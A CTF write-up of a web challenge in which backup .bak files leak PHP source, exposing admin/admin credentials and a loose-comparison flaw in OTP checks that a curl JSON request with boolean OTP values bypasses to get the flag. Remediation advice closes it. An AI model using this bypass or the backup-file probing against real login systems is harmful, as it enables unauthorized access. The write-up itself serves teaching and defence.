---
title: "CTF Write-up: Triangle"
date: 2025-12-16
---

**Category:** Web Security / Source Code Review
**Vulnerability:** PHP Type Juggling (Loose Comparison) & Backup File Disclosure

## 1\. Challenge Description

The challenge presents a login interface protected by a "Trinity" of security layers: a username, a password, and three sequential One-Time Password (OTP) verification steps. The goal is to bypass these layers to retrieve the flag.

> *Description: "The system guards its secrets behind a username, a password, and three sequential verification steps. Only those who truly understand how the application works will pass all three. Break the Trinity and claim the flag."*

## 2\. Reconnaissance

Upon inspecting the target landing page source code, two key pieces of information were gathered:

1.  **The Backup Hint:** An HTML comment at the bottom of the page explicitly mentioned a specific file and the presence of backup extensions.
2.  **The Login Endpoint:** The inline JavaScript on the page contained a `fetch` request targeting `/login.php`.

By combining the `.bak` extension mentioned in the comment with the file paths discovered in the source (`google2fa.php` and `login.php`), we were able to predict and access the backup source files directly:

  * `http://15.206.47.5:8080/login.php.bak`
  * `http://15.206.47.5:8080/google2fa.php.bak`

## 3\. Source Code Analysis

### Credentials Discovery

Analyzing `login.php.bak` revealed the hardcoded credentials for the administrator account:

```php
$USER_DB = [
    "admin" => [
        "password_hash" => password_hash("admin", PASSWORD_DEFAULT),
        // ...
    ]
];
```

  * **Username:** `admin`  **Password:** `admin`

### Identifying the Logic Flaw

In `login.php`, the server generates *new* secret keys for every request:

```php
"key1" => Google2FA::generate_secret_key(),
"key2" => Google2FA::generate_secret_key(),
"key3" => Google2FA::generate_secret_key()
```

Because these keys are regenerated on every page load and never displayed to the user, generating a valid OTP token is mathematically impossible.

However, examining the validation logic in `google2fa.php.bak`:

```php
public static function verify_key($b32seed, $key, $window = 4, $useTimeStamp = true) {
    // ...
    // VULNERABLE LINE BELOW
    if (self::oath_hotp($binarySeed, $ts) == $key) 
        return true;
    // ...
}
```

The code uses the **loose comparison operator (`==`)** instead of the strict comparison operator (`===`).

In PHP:

1.  `oath_hotp(...)` returns a **String** (the generated OTP).
2.  If `$key` (the user input) is provided as a **Boolean `true`**, PHP attempts to convert the types to match.
3.  **Result:** A non-empty String compared to Boolean `true` evaluates to `true`.

## 4\. Exploitation Strategy

The standard HTML form sends data as strings. To exploit this, we must bypass the HTML form and send a raw JSON request where the OTP parameters are actual Boolean types, not strings.

**Payload Construction:**

```json
{
    "username": "admin",
    "password": "admin",
    "otp1": true,
    "otp2": true,
    "otp3": true
}
```

## 5\. Execution

Using `curl`, we sent the malicious JSON payload to the `/login.php` endpoint.

**Command:**

```bash
curl -X POST http://15.206.47.5:8080/login.php \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "admin", "otp1": true, "otp2": true, "otp3": true}'
```

**Server Response:**

```json
{"message":"Flag: ClOuDsEk_ReSeArCH_tEaM_CTF_2025{474a30a63ef1f14e252dc0922f811b16}","data":null}
```

## 6\. Conclusion & Remediation

We successfully bypassed the "Trinity" authentication by exploiting a PHP Type Juggling vulnerability.

**Remediation:**

1.  **Remove Backup Files:** Ensure `.bak` files are deleted or denied access via server configuration.
2.  **Use Strict Comparison:** Change `==` to `===` in `google2fa.php` to ensure the input type matches the expected string type.
    ```php
    // Secure version
    if (self::oath_hotp($binarySeed, $ts) === $key) 
    ```

**Flag:** `ClOuDsEk_ReSeArCH_tEaM_CTF_2025{474a30a63ef1f14e252dc0922f811b16}`
